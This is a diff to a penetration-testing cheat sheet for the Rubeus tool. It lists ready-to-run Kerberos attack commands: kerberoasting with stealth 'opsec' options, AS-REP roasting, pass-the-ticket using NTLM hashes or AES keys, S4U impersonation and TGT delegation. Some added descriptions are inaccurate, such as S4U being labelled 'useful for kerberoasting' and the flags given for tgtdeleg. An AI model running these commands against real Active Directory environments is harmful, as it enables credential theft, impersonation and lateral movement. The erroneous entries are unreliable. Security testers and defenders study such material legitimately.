@@ -1,29 +1,49 @@
-% Rubeus
+% Rubeus (Kerberos Ticket Attacks & Monitoring)
 
-# list kerberoast stats
-.\Rubeus.exe kerberoast /stats
+# Display statistics for Kerberoastable accounts
+Rubeus.exe kerberoast /stats
 
-# list kerberoast stats (OPSEC)
-.\Rubeus.exe kerberoast /stats /rc4opsec
+# Display Kerberoast statistics using RC4 opsec mode (slower but stealthier)
+Rubeus.exe kerberoast /stats /rc4opsec
 
-# request kerberoast TGS all users
-.\Rubeus.exe kerberoast /simple
+# Request service tickets (TGS) for all Kerberoastable users
+Rubeus.exe kerberoast /simple
 
-# request kerberoast TGS for user
-.\Rubeus.exe kerberoast /user:<serviceaccount> /simple
+# Request a service ticket for a specific service account
+Rubeus.exe kerberoast /user:<serviceaccount> /simple
 
-# request kerberoast TGS for user (OPSEC)
-.\Rubeus.exe kerberoast /user:<serviceaccount> /simple /rc4opsec
+# Request a service ticket for a specific account using RC4 opsec mode
+Rubeus.exe kerberoast /user:<serviceaccount> /simple /rc4opsec
 
-# request kerberoast TGS all users an save to file 
-.\Rubeus.exe kerberoast /outfile:<outfile-path>
+# Request service tickets for all users and save the hashes to a file
+Rubeus.exe kerberoast /outfile:<outfile-path>
 
-# request kerberoast TGS all users an save to file (OPSEC)
-.\Rubeus.exe kerberoast /rc4opsec /outfile:<outfile-path>
+# Request service tickets with RC4 opsec mode and save to a file
+Rubeus.exe kerberoast /rc4opsec /outfile:<outfile-path>
 
-# monitor for new tickets
-.\Rubeus.exe monitor /interval:<interval> /nowrap
+# Monitor for new Kerberos tickets at a specified interval (seconds)
+Rubeus.exe monitor /interval:<interval> /nowrap
 
-# monitor for new tickets of specific account
-.\Rubeus.exe monitor /targetuser:<targetuser> /interval:<interval> /nowrap
+# Monitor for new tickets for a specific account
+Rubeus.exe monitor /targetuser:<targetuser> /interval:<interval> /nowrap
 
+# Purge all Kerberos tickets from the current logon session (cleanup)
+Rubeus.exe purge
+
+# Request a Ticket Granting Ticket (TGT) for a user using an AES256 key and inject it
+Rubeus.exe asktgt /user:<username> /aes256:<aeskey> /ptt
+
+# Request a TGT for a user using an NTLM hash and inject it
+Rubeus.exe asktgt /user:<username> /rc4:<ntlmhash> /ptt
+
+# Perform an AS-REP roast to get Kerberos ciphertext for accounts without pre-authentication enabled
+Rubeus.exe asreproast
+
+# Perform an AS-REP roast for a specific user account
+Rubeus.exe asreproast /user:<username>
+
+# Perform a Service-for-User (s4u) attack to obtain a service ticket on behalf of a user (useful for kerberoasting)
+Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:<target-user> /msdsspn:<service> /ptt
+
+# Perform a TGT delegation attack to request a forwardable TGT for an account trusted for delegation
+Rubeus.exe tgtdeleg /user:<username> /ptt
